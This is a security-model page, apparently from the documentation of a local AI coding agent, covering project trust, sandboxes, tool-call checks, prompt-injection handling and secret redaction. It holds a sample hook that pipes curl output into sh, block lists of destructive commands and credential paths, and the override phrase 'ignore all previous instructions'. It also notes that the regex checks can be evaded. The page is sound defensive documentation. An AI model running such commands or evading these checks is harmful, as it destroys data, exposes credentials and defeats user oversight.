# Security model

Ana runs code and shell commands on your machine, driven by a model that reads
untrusted files. This page says what stands in the way of a mistake or an
attack, and what doesn't. The [limits](#what-isnt-protected) are as important as
the protections.

Everything here runs locally. Nothing is sent to a hosted service unless you
point Ana at one or the agent uses a web tool.

## Project trust

Opening a repository must not run its code, so a project's executable config
stays inert until you trust the project:

| File | What it would do |
|---|---|
| `.ana/plugins/` | Python that runs inside Ana |
| `.ana/mcp.json` | Commands started as MCP servers |
| `.ana/hooks.toml` | Shell commands run around tool calls |
| `.ana/lsp.json` | Commands started as language servers |
| `.ana/skills/` | Instructions the agent can load |

`ana` shows exactly what would run and offers two choices:

```
This project can run code through Ana
/home/you/clone

  MCP server  docs: node server.js
  Hook        before read_file: curl https://x.example | sh

Plugins, MCP servers, hooks and LSP servers run with your permissions, outside the sandbox.

  1  Trust this project
  2  Continue without it
```

The answer is keyed on the project's path and a hash of that config, and stored
in `~/.ana/trust.json`. If any of it changes, it stops loading and Ana asks again
next time. Run `ana trust` to review a project you skipped.

Headless runs never prompt. `ana print`, `ana ci` and background agents only load
config you've already trusted, and `ana print --trust` records trust for scripts.

Project plugins and MCP servers belong to the sessions of that project. They don't
appear in another project's sessions on the same backend.

Global config in `~/.ana/` needs no trust: you put it there.

Trust doesn't cover `ana.md`, `.ana/commands/` or `.anaignore`. Those only change
what the model is told or can read.

## What the model can't write

The file tools refuse any path under `.ana/` or `.git/`, at any depth. `write_plan`
is the one exception and can only write `.ana/plan.md`.

`shell_command` isn't covered by this. A command you approve can still change
those directories, and an edit to `.ana/` then stops that config loading until you
trust it again.

## Sandbox

`shell_command`, and the lint and test checks of
[verification](../features/verification.md), run through a backend chosen by
`ANA_SANDBOX_MODE`:

| Mode | Isolation | Platforms |
|---|---|---|
| `sandbox-exec` | Writes only to the project and temp directories. No reads of `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.gcp` or `~/.ana/session.token`. Everything else stays readable. | macOS |
| `docker` | A container with the project mounted at `/workspace`, limited to 512 MB and half a core. | Any, with Docker |
| `bubblewrap` | Linux namespaces with the project mounted at `/workspace`, and read-only system directories. | Linux |
| `local` | **None.** A scrubbed environment and resource limits only. | Any |
| `auto` (default) | The first that works: `sandbox-exec` on macOS, then `docker`, `bubblewrap`, `local`. Decided once per backend. | Any |

An explicit `docker`, `bubblewrap` or `sandbox-exec` that can't run makes the
command fail with an error saying how to fix it. Only `auto` falls back.

Docker needs an image, and Ana doesn't publish one. Build it with
`make sandbox-build` from a source checkout, or point `ANA_SANDBOX_IMAGE` at your
own. Your project's toolchain has to exist inside the container or the bubblewrap
mounts, and a virtualenv that links to a host Python won't run there.

Network access:

| | Network |
|---|---|
| `shell_command` | On in every backend, so `npm install` and `curl` work |
| Lint and test checks | Off in `sandbox-exec`, `docker` and `bubblewrap` |
| Anything in `local` | On. It can't be turned off. |

In every backend the child gets a scrubbed environment, so API keys in your shell
don't reach it, and a timeout (`ANA_SANDBOX_TIMEOUT_SECS`, default 30) kills its
whole process group. Under `sandbox-exec` and `local`, `HOME` and `TMPDIR` point
into the project, and tools may leave caches there.

`shell_command` has an allow-list of programs and runs without a shell, so pipes
and redirects don't work. The allow-list includes `python`, `node` and `make`, so
it is **not** a security boundary. It only keeps out obvious mistakes such as `rm`.
Under `local` and `sandbox-exec`, an argument that plainly names a path outside
the project is refused.

Apple marks `sandbox-exec` as deprecated. It works on current macOS, and it can't
run inside another sandbox.

### Without a sandbox

Linux has no sandbox without bubblewrap. Unless
you run Docker with the image built, commands run as you, with access to everything
you can reach.

Running a project's tests runs its code, so without a sandbox Ana skips lint and
test checks until you trust the project, and says so once per session. Syntax
checks still run because they execute nothing. Once trusted, those checks run with
a scrubbed environment but with network and full disk access.

## Checks on tool calls

Before a tool call can run or ask you anything, in every permission mode including
`auto_accept`, Ana checks its arguments:

| ID | Blocks | Reads |
|---|---|---|
| P03 | Commands that destroy a system: `rm -rf /`, `rm -fr ~`, `mkfs`, `dd of=/dev/sda` | Shell commands, and all arguments of MCP and plugin tools |
| P04 | Credential locations: `.ssh`, `.aws`, `.gnupg`, `id_rsa` and similar, `session.token` | Shell commands, file paths, and all arguments of MCP and plugin tools |

File contents aren't checked, so a model can write documentation that mentions
`rm -rf /`. These checks are regular expressions: they stop accidents and lazy
attacks, and a determined one can spell the command differently.

Your own messages are never blocked. You can ask about `subprocess.run` or
`rm -rf`. They are compared against the same patterns plus P01 (prompt injection)
and matches are written to `~/.ana/audit/constitution.jsonl`, along with blocked
calls and flagged output.

## Prompt injection

Text the agent reads can try to give it orders. Ana does two things:

- Every tool result is wrapped in delimiters marking it as untrusted data.
- Output containing phrases such as "ignore all previous instructions" gets a note
  telling the model not to follow it, and you see a warning. The turn continues.

Neither can make a model immune. A local model can still be talked into things,
which is why the confirmation prompt and the sandbox exist.

## Secrets redaction

Tool output is scanned before the model sees it, and matches are replaced:

```
AKIAIOSFODNN7EXAMPLE  →  [REDACTED:aws_access_key]
```

It recognises AWS, GitHub, Slack, Stripe, Anthropic, OpenAI-style and Google keys,
JWTs, bearer tokens, private key blocks, database URLs with passwords, secret-named
variables such as `DB_PASSWORD=`, quoted passwords, and Ana's own session token.

This is pattern matching. A secret in an unusual format gets through.

## Permission rules

`~/.ana/permissions.db` holds allow, deny and ask rules, which apply in every mode.
Every tool is covered, including MCP and plugin tools, and paths resolve before
matching. See [Permission modes](../configuration/permissions.md#permission-rules).

## Path safety

File tools check every path before access. It must:

1. Resolve, following symlinks, inside the session's project directory
2. Stay out of `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.gcp`, `~/.ana` and system
   directories
3. Not match `.anaignore`
4. For writes, stay out of `.ana/` and `.git/`, and not create a module that
   shadows the Python standard library

## `.anaignore`

Ana reads `.anaignore` from the project root, and from the backend's working
directory. Patterns use fnmatch against the file
name or path. `secrets/` or `secrets` excludes that directory at any depth, and
`config/private/` excludes that path from the root. A `!` pattern re-includes a path,
and the last matching pattern wins. There are no built-in defaults.

File tools and code search respect it, and recursive `grep` also always skips
`.env` and `.env.*`, including `.env.example`, though the model can read that file
directly. `shell_command` does not read `.anaignore`.

## Web tools

`webfetch` asks for confirmation in `default` and `plan` mode, because a URL can
carry out anything the model has read. It only reaches public addresses, checked on
every redirect, which rules out localhost, private ranges, CGNAT and cloud metadata
endpoints. It stops reading at 1 MB and strips scripts and styles from HTML.

The address is checked just before the request, so a DNS answer that changes in
between isn't caught.

`web_search` sends your query to the configured provider without asking.

## The backend

The backend listens on `127.0.0.1` by default and requires a bearer token on every
route except the readiness probe. The token is a random 32-byte value in
`~/.ana/session.token`, created with mode `0600`. Don't expose
the port to a network.

WebSocket clients send the token in the `Authorization` header, or a short-lived
token from `POST /sessions/{id}/ws-token` in the query string. The long-lived token
is not accepted in a query string.

## Installers

`install.sh` verifies the download against the release's published
SHA-256 checksums, then unpack and start the new version before replacing the old
one. The checksums come from the same GitHub release as the archive, so they catch
corruption and a swapped asset, not a compromised release.

## Extensions you add yourself

- **MCP servers and hooks** run as you, outside the sandbox, with your full
  environment, including API keys.
- **Plugins** are Python running inside the Ana backend. They can do anything Ana
  can.
- **Crystallized skills** need `ana skills approve` before they're used.

Only add what you'd be willing to run yourself.

## What isn't protected

- **Linux has no sandbox** without Docker or bubblewrap.
- **`auto_accept` removes the last human check.** With no sandbox, the agent can do
  anything your account can, within the limits of the checks above.
- **A command you approve is only contained by the sandbox.** Approving `python x.py`
  runs whatever that script does. "Always allow" on `python` covers every later
  Python command in the session.
- **`shell_command` has network access.** Under `sandbox-exec` it can read most of
  your disk, so a hostile command could send those files out.
- **`sandbox-exec` protects only the credential paths listed above.** Browser
  profiles, shell history and other tokens stay readable.
- **The `.env` rule is about named paths.** `git diff` or `git log -p` with no path
  can show a tracked `.env`, and a script can open it. Only redaction applies there.
- **Lint and test checks run your project's code,** contained only as far as the
  sandbox reaches.
- **Regular expressions aren't a boundary.** The tool-call checks and redaction can
  both be evaded.
- **Prompt injection is not solved.** See above.

## Reporting a vulnerability

Please don't open a public issue for a security problem. Use GitHub's private
vulnerability reporting on this repository.
